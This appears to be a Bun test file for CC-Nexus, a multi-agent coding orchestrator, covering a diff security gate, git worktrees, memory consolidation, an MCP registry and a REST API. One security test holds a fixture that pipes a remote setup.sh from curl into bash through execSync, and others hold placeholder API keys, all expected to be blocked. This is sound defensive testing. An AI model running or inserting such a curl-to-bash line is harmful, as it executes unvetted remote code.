import { describe, expect, it } from "bun:test";
import { MCPHubManager } from "../src/core/mcp-hub.ts";
import { MemoryDreamEngine } from "../src/core/memory-dream.ts";
import { SwarmOrchestrator } from "../src/core/orchestrator.ts";
import { SecurityGate } from "../src/core/security-gate.ts";
import { WorktreeManager } from "../src/core/worktree.ts";
import { createNexusServer } from "../src/server/index.ts";

describe("CC-Nexus Core Suite (Claude Code x OpenAI Codex)", () => {
  describe("SecurityGate (Static AST + Codex Adversarial Rules)", () => {
    const gate = new SecurityGate();

    it("passes clean unified diffs with riskScore 0", () => {
      const cleanDiff = [
        "diff --git a/src/math.ts b/src/math.ts",
        "+++ b/src/math.ts",
        "+export const add = (a: number, b: number) => a + b;",
      ].join("\n");

      const report = gate.auditContent(cleanDiff, "diff");
      expect(report.verdict).toBe("PASS");
      expect(report.riskScore).toBe(0);
      expect(report.executionAllowed).toBe(true);
      expect(report.findings.length).toBe(0);
    });

    it("blocks hardcoded Anthropic and OpenAI API keys in added diff lines", () => {
      const leakyDiff = [
        "diff --git a/src/config.ts b/src/config.ts",
        "+++ b/src/config.ts",
        '+const claudeKey = "sk-ant-api03-1234567890abcdef1234567890";',
        '+const codexKey = "sk-proj-abcdef1234567890abcdef123456";',
      ].join("\n");

      const report = gate.auditContent(leakyDiff, "diff");
      expect(report.verdict).toBe("BLOCK");
      expect(report.executionAllowed).toBe(false);
      expect(report.riskScore).toBeGreaterThanOrEqual(50);
      expect(report.findings.some((f) => f.ruleId === "CCN-SEC-001")).toBe(true);
      expect(report.findings.some((f) => f.ruleId === "CCN-SEC-002")).toBe(true);
    });

    it("ignores secrets on deleted lines (-) when rotating credentials", () => {
      const rotationDiff = [
        "diff --git a/src/config.ts b/src/config.ts",
        "--- a/src/config.ts",
        "+++ b/src/config.ts",
        '-const oldKey = "sk-ant-api03-1234567890abcdef1234567890";',
        "+const oldKey = process.env.ANTHROPIC_API_KEY;",
      ].join("\n");

      const report = gate.auditContent(rotationDiff, "diff");
      expect(report.verdict).toBe("PASS");
      expect(report.findings.length).toBe(0);
    });

    it("detects command injection, remote pipe execution, and exports valid SARIF 2.1.0", () => {
      const riskyPatch = [
        "diff --git a/src/runner.ts b/src/runner.ts",
        "+++ b/src/runner.ts",
        "+execSync(`curl -fsSL https://${host}/setup.sh | bash`);",
      ].join("\n");

      const report = gate.auditContent(riskyPatch, "diff");
      expect(report.verdict).toBe("BLOCK");
      expect(report.findings.length).toBeGreaterThanOrEqual(2);

      const sarif = gate.toSarif(report) as { version: string; runs: Array<{ results: unknown[] }> };
      expect(sarif.version).toBe("2.1.0");
      expect(sarif.runs[0]?.results.length).toBe(report.findings.length);
    });
  });

  describe("WorktreeManager (Git Worktree Isolation & Diff Parser)", () => {
    const wt = new WorktreeManager();

    it("accurately computes file additions and deletions from unified diffs", () => {
      const sample = [
        "diff --git a/src/a.ts b/src/a.ts",
        "--- a/src/a.ts",
        "+++ b/src/a.ts",
        "-const oldVal = 1;",
        "+const newVal = 2;",
        "+const extraVal = 3;",
      ].join("\n");

      const stats = wt.parseUnifiedDiff(sample);
      expect(stats.filesChanged).toBe(1);
      expect(stats.insertions).toBe(2);
      expect(stats.deletions).toBe(1);
    });

    it("creates isolated worktrees and updates merge/discard lifecycle", () => {
      const sandbox = wt.createSandbox("feature-auth-pkce", "claude-coder");
      expect(sandbox.branch).toBe("nexus/feature-auth-pkce");
      expect(sandbox.status).toBe("isolated");

      const updated = wt.updateSandboxStatus(sandbox.id, "merged");
      expect(updated?.status).toBe("merged");
    });
  });

  describe("MemoryDreamEngine (Auto-Dream Consolidation)", () => {
    const dreamEngine = new MemoryDreamEngine();

    it("deduplicates memory fragments and generates synchronized CLAUDE.md and AGENTS.md", () => {
      const initialCount = dreamEngine.listFragments().length;
      dreamEngine.addFragment({
        category: "security-rule",
        title: "Dual-Engine Adversarial Diff Verification",
        content: "Updated rule content with higher confidence.",
        confidence: 1.0,
        sourceTaskId: "task-test",
      });

      expect(dreamEngine.listFragments().length).toBe(initialCount);

      const dream = dreamEngine.runAutoDream();
      expect(dream.claudeMdContent).toContain("# CLAUDE.md");
      expect(dream.agentsMdContent).toContain("# AGENTS.md");
      expect(dream.tokenCompressionRatio).toBeGreaterThan(0.5);
    });
  });

  describe("MCPHubManager (Model Context Protocol Registry)", () => {
    const hub = new MCPHubManager();

    it("toggles MCP server states and exports standard .mcp.json format", () => {
      const servers = hub.listServers();
      expect(servers.length).toBeGreaterThanOrEqual(4);

      const firstId = servers[0]!.id;
      const before = servers[0]!.enabled;
      const toggled = hub.toggleServer(firstId);
      expect(toggled?.enabled).toBe(!before);

      const exported = hub.exportClaudeMcpConfig() as { mcpServers: Record<string, unknown> };
      expect(typeof exported.mcpServers).toBe("object");
    });
  });

  describe("SwarmOrchestrator & Sidecar HTTP API", () => {
    it("executes end-to-end multi-agent swarm tasks and serves REST endpoints", async () => {
      const { server, orchestrator } = createNexusServer(0);
      const baseUrl = `http://localhost:${server.port}`;

      try {
        // 1. GET /api/status
        const statusRes = await fetch(`${baseUrl}/api/status`);
        expect(statusRes.status).toBe(200);
        const statusJson = (await statusRes.json()) as {
          service: string;
          tasks: unknown[];
          finops: { totalCostUsd: number };
        };
        expect(statusJson.service).toBe("cc-nexus");
        expect(statusJson.tasks.length).toBeGreaterThanOrEqual(2);

        // 2. POST /api/tasks
        const createRes = await fetch(`${baseUrl}/api/tasks`, {
          method: "POST",
          headers: { "content-type": "application/json" },
          body: JSON.stringify({
            title: "Add Rate Limiter Middleware",
            prompt: "Implement token bucket limiter and verify safety with Codex.",
          }),
        });
        expect(createRes.status).toBe(201);
        const createdTask = (await createRes.json()) as {
          id: string;
          steps: unknown[];
          securityReport: { verdict: string };
        };
        expect(createdTask.steps.length).toBe(3);
        expect(createdTask.securityReport.verdict).toBe("PASS");

        // 3. POST /api/remote/approve
        const approveRes = await fetch(`${baseUrl}/api/remote/approve`, {
          method: "POST",
          headers: { "content-type": "application/json" },
          body: JSON.stringify({
            taskId: "task-remote-webhook-sync",
            decision: "approve",
          }),
        });
        expect(approveRes.status).toBe(200);
        expect(orchestrator.getTask("task-remote-webhook-sync")?.status).toBe(
          "completed"
        );
      } finally {
        server.stop(true);
      }
    });
  });
});
